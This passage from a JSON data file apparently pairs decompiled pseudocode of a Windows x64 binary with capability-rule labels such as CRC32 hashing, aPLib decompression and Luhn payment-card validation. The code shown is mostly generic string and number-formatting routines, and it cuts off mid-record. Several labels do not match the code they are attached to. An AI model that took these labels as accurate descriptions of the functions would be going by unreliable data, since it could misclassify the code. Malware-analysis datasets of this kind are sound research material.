iVar3;\n    }\n    arg1[2] = arg3;\n    arg1[3] = piVar7;\n    fcn.140007990(piVar5, arg2, arg3);\n    *(arg3 + piVar5) = 0;\n    if (0xf < piVar1) {\n        piVar7 = *arg1;\n        piVar6 = piVar7;\n        if ((0xfff < piVar1 + 1U) && (piVar6 = piVar7[-1],  0x1f < piVar7 + (-8 - piVar6))) {\ncode_r0x000140002690:\n            fcn.14000c048();\n            pcVar2 = swi(3);\n            ppiVar4 = (*pcVar2)();\n            return ppiVar4;\n        }\n        fcn.140005b7c(piVar6);\n    }\n    *arg1 = piVar5;\n    return arg1;\n}\n",
        "token_count": 801
    },
    "14000272": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t * fcn.140002720(uint64_t *arg1, uint64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t *puVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    int64_t in_stack_00000028;\n    \n    uVar8 = arg1[2];\n    if (0x7fffffffffffffff - uVar8 < arg2) {\n        fcn.1400012b0();\n        pcVar3 = swi(3);\n        puVar5 = (*pcVar3)();\n        return puVar5;\n    }\n    uVar2 = arg1[3];\n    uVar6 = arg2 + uVar8 | 0xf;\n    uVar7 = 0x7fffffffffffffff;\n    if (((uVar6 < 0x8000000000000000) && (uVar2 <= 0x7fffffffffffffff - (uVar2 >> 1))) &&\n       (uVar1 = (uVar2 >> 1) + uVar2,  uVar7 = uVar6,  uVar6 < uVar1)) {\n        uVar7 = uVar1;\n    }\n    uVar6 = uVar7 + 1;\n    if (uVar7 == 0xffffffffffffffff) {\n        uVar6 = 0xffffffffffffffff;\n    }\n    if (uVar6 < 0x1000) {\n        if (uVar6 == 0) {\n            uVar6 = 0;\n        }\n        else {\n            uVar6 = fcn.140005b40(uVar6);\n        }\n    }\n    else {\n        if (uVar6 + 0x27 <= uVar6) {\n            fcn.140001210();\n            pcVar3 = swi(3);\n            puVar5 = (*pcVar3)();\n            return puVar5;\n        }\n        iVar4 = fcn.140005b40(uVar6 + 0x27);\n        if (iVar4 == 0) goto code_r0x00014000289a;\n        uVar6 = iVar4 + 0x27U & 0xffffffffffffffe0;\n        *(uVar6 - 8) = iVar4;\n    }\n    arg1[2] = arg2 + uVar8;\n    iVar4 = uVar6 + uVar8;\n    arg1[3] = uVar7;\n    if (uVar2 < 0x10) {\n        fcn.140007990(uVar6, arg1, uVar8);\n        fcn.140007990(iVar4, arg4, in_stack_00000028);\n        *(iVar4 + in_stack_00000028) = 0;\n    }\n    else {\n        uVar7 = *arg1;\n        fcn.140007990(uVar6, uVar7, uVar8);\n        fcn.140007990(iVar4, arg4, in_stack_00000028);\n        *(iVar4 + in_stack_00000028) = 0;\n        uVar8 = uVar7;\n        if ((0xfff < uVar2 + 1) && (uVar8 = *(uVar7 - 8),  0x1f < (uVar7 - uVar8) - 8)) {\ncode_r0x00014000289a:\n            fcn.14000c048();\n            pcVar3 = swi(3);\n            puVar5 = (*pcVar3)();\n            return puVar5;\n        }\n        fcn.140005b7c(uVar8);\n    }\n    *arg1 = uVar6;\n    return arg1;\n}\n",
        "token_count": 837
    },
    "140002ea": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nint64_t * fcn.140002ea4(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t arg2_00;\n    code *pcVar3;\n    int64_t arg1_00;\n    int64_t *piVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uchar in_R9B;\n    \n    iVar7 = arg1[2];\n    uVar6 = 0x7fffffffffffffff;\n    if (0x7fffffffffffffffU - iVar7 < arg2) {\n        fcn.1400012b0();\n        pcVar3 = swi(3);\n        piVar4 = (*pcVar3)();\n        return piVar4;\n    }\n    uVar2 = arg1[3];\n    uVar5 = iVar7 + arg2 | 0xf;\n    if ((uVar5 < 0x8000000000000000) && (uVar2 <= 0x7fffffffffffffff - (uVar2 >> 1))) {\n        uVar1 = (uVar2 >> 1) + uVar2;\n        uVar6 = uVar5;\n        if (uVar5 < uVar1) {\n            uVar6 = uVar1;\n        }\n        uVar5 = uVar6 + 1;\n        if (uVar5 < 0x1000) {\n            if (uVar5 == 0) {\n                arg1_00 = 0;\n            }\n            else {\n                arg1_00 = fcn.140005b40(uVar5);\n            }\n            goto code_r0x000140002f48;\n        }\n    }\n    else {\n        uVar5 = 0x8000000000000000;\n    }\n    arg1_00 = fcn.1400028b0(uVar5);\ncode_r0x000140002f48:\n    arg1[2] = iVar7 + arg2;\n    arg1[3] = uVar6;\n    if (uVar2 < 0x10) {\n        fcn.140007990(arg1_00, arg1, iVar7);\n        *(iVar7 + arg1_00) = in_R9B;\n        *(iVar7 + 1 + arg1_00) = 0;\n    }\n    else {\n        arg2_00 = *arg1;\n        fcn.140007990(arg1_00, arg2_00, iVar7);\n        *(iVar7 + arg1_00) = in_R9B;\n        *(iVar7 + 1 + arg1_00) = 0;\n        iVar7 = arg2_00;\n        if (0xfff < uVar2 + 1) {\n            iVar7 = *(arg2_00 + -8);\n            if (0x1f < (arg2_00 - iVar7) - 8U) {\n                fcn.14000c048(iVar7, uVar2 + 0x28);\n                pcVar3 = swi(3);\n                piVar4 = (*pcVar3)();\n                return piVar4;\n            }\n        }\n        fcn.140005b7c(iVar7);\n    }\n    *arg1 = arg1_00;\n    return arg1;\n}\n",
        "token_count": 728
    },
    "14000dbc": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.14000dbc0(int64_t arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar4 = *(arg1 + 0x458);\n    if (iVar4 == 0) {\n        uVar2 = 0x200;\n        iVar4 = arg1 + 0x50;\n    }\n    else {\n        uVar2 = *(arg1 + 0x450) >> 1;\n    }\n    iVar4 = (uVar2 - 1) + iVar4;\n    *(arg1 + 0x40) = iVar4;\n    iVar3 = iVar4;\n    while( true ) {\n        if ((*(arg1 + 0x30) < 1) && (arg2 == 0)) break;\n        uVar1 = arg2;\n        *(arg1 + 0x30) = *(arg1 + 0x30) + -1;\n        arg2._0_4_ = arg2 >> 3;\n        **(arg1 + 0x40) = (uVar1 & 7) + 0x30;\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -1;\n        iVar3 = *(arg1 + 0x40);\n    }\n    *(arg1 + 0x48) = iVar4 - *(arg1 + 0x40);\n    *(arg1 + 0x40) = iVar3 + 1;\n    return;\n}\n",
        "token_count": 346
    },
    "14000dcc": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.14000dcc4(int64_t arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint8_t in_R8B;\n    int64_t iVar3;\n    char cVar4;\n    \n    iVar3 = *(arg1 + 0x458);\n    if (iVar3 == 0) {\n        uVar1 = 0x200;\n        iVar3 = arg1 + 0x50;\n    }\n    else {\n        uVar1 = *(arg1 + 0x450) >> 1;\n    }\n    iVar3 = (uVar1 - 1) + iVar3;\n    *(arg1 + 0x40) = iVar3;\n    iVar2 = iVar3;\n    uVar1 = arg2;\n    while ((0 < *(arg1 + 0x30) || (uVar1 != 0))) {\n        *(arg1 + 0x30) = *(arg1 + 0x30) + -1;\n        cVar4 = uVar1 + (uVar1 / 10) * -10 + '0';\n        if ('9' < cVar4) {\n            cVar4 = (in_R8B ^ 1) * ' ' + '\\a' + cVar4;\n        }\n        **(arg1 + 0x40) = cVar4;\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -1;\n        iVar2 = *(arg1 + 0x40);\n        uVar1 = uVar1 / 10;\n    }\n    *(arg1 + 0x48) = iVar3 - *(arg1 + 0x40);\n    *(arg1 + 0x40) = iVar2 + 1;\n    return;\n}\n",
        "token_count": 395
    },
    "14000de2": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.14000de24(int64_t arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint8_t uVar3;\n    uint8_t in_R8B;\n    int64_t iVar4;\n    \n    iVar4 = *(arg1 + 0x458);\n    if (iVar4 == 0) {\n        uVar1 = 0x200;\n        iVar4 = arg1 + 0x50;\n    }\n    else {\n        uVar1 = *(arg1 + 0x450) >> 1;\n    }\n    iVar4 = (uVar1 - 1) + iVar4;\n    *(arg1 + 0x40) = iVar4;\n    iVar2 = iVar4;\n    while( true ) {\n        if ((*(arg1 + 0x30) < 1) && (arg2 == 0)) break;\n        uVar3 = arg2;\n        arg2._0_4_ = arg2 >> 4;\n        uVar3 = (uVar3 & 0xf) + 0x30;\n        *(arg1 + 0x30) = *(arg1 + 0x30) + -1;\n        if (0x39 < uVar3) {\n            uVar3 = (in_R8B ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(arg1 + 0x40) = uVar3;\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -1;\n        iVar2 = *(arg1 + 0x40);\n    }\n    *(arg1 + 0x48) = iVar4 - *(arg1 + 0x40);\n    *(arg1 + 0x40) = iVar2 + 1;\n    return;\n}\n",
        "token_count": 405
    },
    "14000df5": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.14000df54(int64_t arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    iVar3 = *(arg1 + 0x458);\n    if (iVar3 == 0) {\n        uVar1 = 0x200;\n        iVar3 = arg1 + 0x50;\n    }\n    else {\n        uVar1 = *(arg1 + 0x450) >> 1;\n    }\n    iVar3 = (uVar1 - 1) + iVar3;\n    *(arg1 + 0x40) = iVar3;\n    iVar2 = iVar3;\n    for (; (0 < *(arg1 + 0x30) || (arg2 != 0)); arg2 = arg2 >> 3) {\n        *(arg1 + 0x30) = *(arg1 + 0x30) + -1;\n        **(arg1 + 0x40) = (arg2 & 7) + 0x30;\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -1;\n        iVar2 = *(arg1 + 0x40);\n    }\n    *(arg1 + 0x48) = iVar3 - *(arg1 + 0x40);\n    *(arg1 + 0x40) = iVar2 + 1;\n    return;\n}\n",
        "token_count": 317
    },
    "14000e05": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.14000e058(int64_t arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint8_t in_R8B;\n    int64_t iVar3;\n    char cVar4;\n    \n    iVar3 = *(arg1 + 0x458);\n    if (iVar3 == 0) {\n        uVar1 = 0x200;\n        iVar3 = arg1 + 0x50;\n    }\n    else {\n        uVar1 = *(arg1 + 0x450) >> 1;\n    }\n    iVar3 = (uVar1 - 1) + iVar3;\n    *(arg1 + 0x40) = iVar3;\n    iVar2 = iVar3;\n    while ((0 < *(arg1 + 0x30) || (arg2 != 0))) {\n        *(arg1 + 0x30) = *(arg1 + 0x30) + -1;\n        cVar4 = arg2 + (arg2 / 10) * -10 + '0';\n        if ('9' < cVar4) {\n            cVar4 = (in_R8B ^ 1) * ' ' + '\\a' + cVar4;\n        }\n        **(arg1 + 0x40) = cVar4;\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -1;\n        iVar2 = *(arg1 + 0x40);\n        arg2 = arg2 / 10;\n    }\n    *(arg1 + 0x48) = iVar3 - *(arg1 + 0x40);\n    *(arg1 + 0x40) = iVar2 + 1;\n    return;\n}\n",
        "token_count": 384
    },
    "14000e1c": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.14000e1c4(int64_t arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint8_t uVar3;\n    uint8_t in_R8B;\n    int64_t iVar4;\n    \n    iVar4 = *(arg1 + 0x458);\n    if (iVar4 == 0) {\n        uVar1 = 0x200;\n        iVar4 = arg1 + 0x50;\n    }\n    else {\n        uVar1 = *(arg1 + 0x450) >> 1;\n    }\n    iVar4 = (uVar1 - 1) + iVar4;\n    *(arg1 + 0x40) = iVar4;\n    iVar2 = iVar4;\n    while ((0 < *(arg1 + 0x30) || (arg2 != 0))) {\n        uVar3 = arg2;\n        arg2 = arg2 >> 4;\n        uVar3 = (uVar3 & 0xf) + 0x30;\n        *(arg1 + 0x30) = *(arg1 + 0x30) + -1;\n        if (0x39 < uVar3) {\n            uVar3 = (in_R8B ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(arg1 + 0x40) = uVar3;\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -1;\n        iVar2 = *(arg1 + 0x40);\n    }\n    *(arg1 + 0x48) = iVar4 - *(arg1 + 0x40);\n    *(arg1 + 0x40) = iVar2 + 1;\n    return;\n}\n",
        "token_count": 395
    },
    "14000f36": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.14000f368(int64_t arg1)\n\n{\n    int32_t *arg4;\n    int64_t **arg1_00;\n    int16_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    char cVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    uint64_t arg3;\n    uint64_t uVar7;\n    int32_t iVar8;\n    ushort uVar9;\n    int32_t iVar10;\n    uint64_t uVar11;\n    uint32_t uVar12;\n    int64_t arg2;\n    uchar auStack120 [32];\n    ulong uStack88;\n    ushort auStack72 [2];\n    uint uStack68;\n    ushort uStack64;\n    uint64_t uStack56;\n    \n    uStack56 = *0x14003e020 ^ auStack120;\n    uVar5 = *(arg1 + 0x3a);\n    uVar9 = 0x78;\n    uVar11 = 1;\n    if (uVar5 < 0x65) {\n        if (uVar5 == 100) {\ncode_r0x00014000f48f:\n            *(arg1 + 0x28) = *(arg1 + 0x28) | 0x10;\ncode_r0x00014000f493:\n            cVar4 = fcn.14000d600(arg1);\n        }\n        else {\n            if (uVar5 != 0x41) {\n                if (uVar5 == 0x43) {\ncode_r0x00014000f3fb:\n                    cVar4 = fcn.14000fe28(arg1);\n                }\n                else {\n                    if (uVar5 < 0x45) goto code_r0x00014000f799;\n                    if (uVar5 < 0x48) goto code_r0x00014000f49c;\n                    if (uVar5 == 0x53) {\ncode_r0x00014000f451:\n                        cVar4 = fcn.140010038(arg1);\n                    }\n                    else {\n                        if (uVar5 == 0x58) goto code_r0x00014000f414;\n                        if (uVar5 != 0x5a) {\n                            if (uVar5 != 0x61) {\n                                if (uVar5 != 99) goto code_r0x00014000f799;\n                                goto code_r0x00014000f3fb;\n                            }\n                            goto code_r0x00014000f49c;\n                        }\n                        cVar4 = fcn.14000f83c(arg1);\n                    }\n                }\n                goto code_r0x00014000f4a1;\n            }\ncode_r0x00014000f49c:\n            cVar4 = fcn.14000fb04(arg1);\n        }\n    }\n    else {\n        if (uVar5 < 0x68) goto code_r0x00014000f49c;\n        if (uVar5 == 0x69) goto code_r0x00014000f48f;\n        if (uVar5 == 0x6e) {\n            cVar4 = fcn.14000feec(arg1);\n        }\n        else if (uVar5 == 0x6f) {\n            if ((*(arg1 + 0x28) >> 5 & 1) != 0) {\n                *(arg1 + 0x28) = *(arg1 + 0x28) | 0x80;\n            }\n            cVar4 = fcn.14000d22c(arg1);\n        }\n        else {\n            if (uVar5 == 0x70) {\n                *(arg1 + 0x30) = 0x10;\n                *(arg1 + 0x34) = 0xb;\n            }\n            else {\n                if (uVar5 == 0x73) goto code_r0x00014000f451;\n                if (uVar5 == 0x75) goto code_r0x00014000f493;\n                if (uVar5 != 0x78) goto code_r0x00014000f799;\n            }\ncode_r0x00014000f414:\n            cVar4 = fcn.14000d9d4(arg1);\n        }\n    }\ncode_r0x00014000f4a1:\n    uVar7 = 0;\n    if ((cVar4 == '\\0') || (*(arg1 + 0x38) != '\\0')) goto code_r0x00014000f799;\n    uVar12 = *(arg1 + 0x28);\n    uStack68 = 0;\n    uStack64 = 0;\n    arg3 = uVar7;\n    if ((uVar12 >> 4 & 1) != 0) {\n        if ((uVar12 >> 6 & 1) == 0) {\n            if ((uVar12 & 1) == 0) {\n                arg3 = 0;\n                if ((uVar12 >> 1 & 1) != 0) {\n                    uStack68 = 0x20;\n                    arg3 = uVar11;\n                }\n                goto code_r0x00014000f50c;\n            }\n            uVar5 = 0x2b;\n        }\n        else {\n            uVar5 = 0x2d;\n        }\n        uStack68 = uVar5;\n        arg3 = uVar11;\n    }\ncode_r0x00014000f50c:\n    iVar1 = *(arg1 + 0x3a);\n    if (((iVar1 - 0x58U & 0xffdf) != 0) || ((uVar12 >> 5 & 1) == 0)) {\n        uVar11 = uVar7;\n    }\n    if ((uVar11 != '\\0') || ((iVar1 - 0x41U & 0xffdf) == 0)) {\n        *(&uStack68 + arg3 * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            uVar9 = 0x58;\n        }\n        *(&uStack68 + arg3 * 2 + 2) = uVar9;\n        arg3 = arg3 + 2;\n    }\n    iVar8 = (*(arg1 + 0x2c) - arg3) - *(arg1 + 0x48);\n    if (((uVar12 & 0xc) == 0) && (0 < iVar8)) {\n        iVar6 = *(arg1 + 0x20);\n        uVar11 = uVar7;\n        do {\n            iVar2 = *(arg1 + 0x460);\n            if (*(iVar2 + 0x10) == *(iVar2 + 8)) {\n                if (*(iVar2 + 0x18) == '\\0') {\n                    iVar6 = -1;\n                }\n                else {\n                    iVar6 = iVar6 + 1;\n                }\n                *(arg1 + 0x20) = iVar6;\n            }\n            else {\n                *(arg1 + 0x20) = iVar6 + 1;\n                *(iVar2 + 0x10) = *(iVar2 + 0x10) + 1;\n                ***(arg1 + 0x460) = 0x20;\n                **(arg1 + 0x460) = **(arg1 + 0x460) + 2;\n                iVar6 = *(arg1 + 0x20);\n            }\n        } while ((iVar6 != -1) && (uVar12 = uVar11 + 1,  uVar11 = uVar12,  uVar12 < iVar8));\n    }\n    uStack88 = *(arg1 + 8);\n    arg4 = arg1 + 0x20;\n    arg1_00 = arg1 + 0x460;\n    fcn.140010264(arg1_00, &uStack68, arg3, arg4);\n    if (((*(arg1 + 0x28) >> 3 & 1) != 0) && (((*(arg1 + 0x28) >> 2 & 1) == 0 && (0 < iVar8)))) {\n        iVar6 = *arg4;\n        uVar11 = uVar7;\n        do {\n            piVar3 = *arg1_00;\n            if (piVar3[2] == piVar3[1]) {\n                if (*(piVar3 + 3) == '\\0') {\n                    iVar6 = -1;\n                }\n                else {\n                    iVar6 = iVar6 + 1;\n                }\n                *arg4 = iVar6;\n            }\n            else {\n                *arg4 = iVar6 + 1;\n                piVar3[2] = piVar3[2] + 1;\n                ***arg1_00 = 0x30;\n                **arg1_00 = **arg1_00 + 2;\n                iVar6 = *arg4;\n            }\n        } while ((iVar6 != -1) && (uVar12 = uVar11 + 1,  uVar11 = uVar12,  uVar12 < iVar8));\n    }\n    if ((*(arg1 + 0x4c) == '\\0') && (iVar6 = *(arg1 + 0x48),  0 < iVar6)) {\n        iVar2 = *(arg1 + 8);\n        if (*(iVar2 + 0x28) == '\\0') {\n            fcn.140010150(iVar2);\n            iVar6 = *(arg1 + 0x48);\n        }\n        arg2 = *(arg1 + 0x40);\n        if (iVar6 != 0) {\n            do {\n                auStack72[0] = 0;\n                iVar6 = fcn.14001ba3c(auStack72, arg2, *(*(iVar2 + 0x18) + 8), *(arg1 + 8));\n                if (iVar6 < 1) {\n                    *(arg1 + 0x20) = 0xffffffff;\n                    break;\n                }\n                piVar3 = *arg1_00;\n                if (piVar3[2] == piVar3[1]) {\n                    if (*(piVar3 + 3) == '\\0') {\n                        *(arg1 + 0x20) = 0xffffffff;\n                    }\n                    else {\n                        *(arg1 + 0x20) = *(arg1 + 0x20) + 1;\n                    }\n                }\n                else {\n                    *(arg1 + 0x20) = *(arg1 + 0x20) + 1;\n                    piVar3[2] = piVar3[2] + 1;\n                    ***arg1_00 = auStack72[0];\n                    **arg1_00 = **arg1_00 + 2;\n                }\n                arg2 = arg2 + iVar6;\n                uVar12 = uVar7 + 1;\n                uVar7 = uVar12;\n            } while (uVar12 != *(arg1 + 0x48));\n        }\n    }\n    else {\n        uStack88 = *(arg1 + 8);\n        fcn.140010264(arg1_00, *(arg1 + 0x40), *(arg1 + 0x48), arg4);\n    }\n    iVar6 = *arg4;\n    if (((-1 < iVar6) && ((*(arg1 + 0x28) >> 2 & 1) != 0)) && (iVar10 = 0,  0 < iVar8)) {\n        do {\n            piVar3 = *arg1_00;\n            if (piVar3[2] == piVar3[1]) {\n                if (*(piVar3 + 3) == '\\0') {\n                    iVar6 = -1;\n                }\n                else {\n                    iVar6 = iVar6 + 1;\n                }\n                *arg4 = iVar6;\n            }\n            else {\n                *arg4 = iVar6 + 1;\n                piVar3[2] = piVar3[2] + 1;\n                ***arg1_00 = 0x20;\n                **arg1_00 = **arg1_00 + 2;\n                iVar6 = *arg4;\n            }\n        } while ((iVar6 != -1) && (iVar10 = iVar10 + 1,  iVar10 < iVar8));\n    }\ncode_r0x00014000f799:\n    fcn.140005b20(uStack56 ^ auStack120);\n    return;\n}\n",
        "token_count": 2762
    },
    "14000f7c": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.14000f7c4(int64_t arg1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    uint64_t uVar4;\n    bool bVar5;\n    \n    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n    puVar3 = *(*(arg1 + 0x18) + -8);\n    if ((puVar3 == NULL) || (*(puVar3 + 4) == 0)) {\n        uVar4 = 6;\n        *(arg1 + 0x40) = \"(null)\";\n    }\n    else {\n        iVar2 = *(arg1 + 0x34);\n        if (iVar2 == 2) {\ncode_r0x00014000f80c:\n            bVar5 = false;\n        }\n        else if ((iVar2 == 3) || (iVar2 == 0xc)) {\n            bVar5 = true;\n        }\n        else {\n            if (*(arg1 + 0x34) == 0xd) goto code_r0x00014000f80c;\n            bVar5 = (*(arg1 + 0x39) + 0x9dU & 0xef) != 0;\n        }\n        *(arg1 + 0x40) = *(puVar3 + 4);\n        uVar1 = *puVar3;\n        uVar4 = uVar1;\n        if (bVar5) {\n            *(arg1 + 0x4c) = 1;\n            uVar4 = uVar1 >> 1;\n            goto code_r0x00014000f836;\n        }\n    }\n    *(arg1 + 0x4c) = 0;\ncode_r0x00014000f836:\n    *(arg1 + 0x48) = uVar4;\n    return CONCAT71(uVar4 >> 8, 1);\n}\n",
        "token_count": 429
    },
    "14000f83": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.14000f83c(ulong *arg1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int64_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    arg1[3] = arg1[3] + 8;\n    puVar2 = *(arg1[3] + -8);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 4),  iVar3 == 0)) {\n        arg1[8] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.14000c5fc(*arg1, *(arg1 + 0x3a), *(arg1 + 0x34));\n        arg1[8] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(arg1 + 0x4c) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x00014000f8a0;\n        }\n    }\n    *(arg1 + 0x4c) = 0;\ncode_r0x00014000f8a0:\n    *(arg1 + 9) = uVar5;\n    return 1;\n}\n",
        "token_count": 307
    },
    "14000fd6": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.14000fd64(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint64_t arg3;\n    uchar *puVar3;\n    \n    iVar1 = *(arg1 + 0x34);\n    if ((iVar1 == 2) ||\n       (((iVar1 != 3 && (iVar1 != 0xc)) && ((*(arg1 + 0x34) == 0xd || ((*(arg1 + 0x39) + 0x9dU & 0xef) == 0)))))) {\n        puVar3 = *(arg1 + 0x458);\n        if (*(arg1 + 0x458) == NULL) {\n            puVar3 = arg1 + 0x50;\n        }\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n        *puVar3 = *(*(arg1 + 0x18) + -8);\n        *(arg1 + 0x48) = 1;\n    }\n    else {\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n        iVar2 = *(arg1 + 0x458);\n        if (iVar2 == 0) {\n            arg3 = 0x200;\n            iVar2 = arg1 + 0x50;\n        }\n        else {\n            arg3 = *(arg1 + 0x450) >> 1;\n        }\n        iVar1 = fcn.14001b88c(arg1 + 0x48, iVar2, arg3);\n        if (iVar1 != 0) {\n            *(arg1 + 0x38) = 1;\n        }\n    }\n    iVar2 = *(arg1 + 0x458);\n    if (*(arg1 + 0x458) == 0) {\n        iVar2 = arg1 + 0x50;\n    }\n    *(arg1 + 0x40) = iVar2;\n    return 1;\n}\n",
        "token_count": 444
    },
    "140026b6": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint32_t fcn.140026b68(void)\n\n{\n    uint32_t uVar1;\n    uint32_t in_MXCSR;\n    \n    uVar1 = (((in_MXCSR & 0x3f) >> 2 & 8 | in_MXCSR & 0x10) >> 2 | in_MXCSR & 8) >> 1 |\n            ((in_MXCSR & 2) << 3 | in_MXCSR & 4) * 2 | (in_MXCSR & 1) << 4;\n    return uVar1 << 0x18 | uVar1;\n}\n",
        "token_count": 137
    },
    "1400026a": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong * fcn.1400026a0(ulong *arg1, ulong arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    uint64_t noname_2;\n    ulong *puVar2;\n    \n    iVar1 = arg1[2];\n    noname_2 = arg1[3];\n    if (arg3 <= noname_2 - iVar1) {\n        arg1[2] = iVar1 + arg3;\n        puVar2 = arg1;\n        if (0xf < noname_2) {\n            puVar2 = *arg1;\n        }\n        fcn.140007990(puVar2 + iVar1, arg2, arg3);\n        *(puVar2 + iVar1 + arg3) = 0;\n        return arg1;\n    }\n    puVar2 = fcn.140002720(arg1, arg3, noname_2, arg2);\n    return puVar2;\n}\n",
        "token_count": 207
    },
    "14000297": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140002970(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong arg2_00;\n    ulong *puVar1;\n    \n    arg2_00 = fcn.14000c1e0(1);\n    puVar1 = fcn.1400028f0();\n    fcn.1400103d8(*puVar1, arg2_00, arg1, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "140004c6": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\ncode ** fcn.140004c68(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.140007678(&uStack24, arg1 + 1);\n    *arg1 = vtable.std::length_error.0;\n    return arg1;\n}\n",
        "token_count": 115
    },
    "140004ce": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
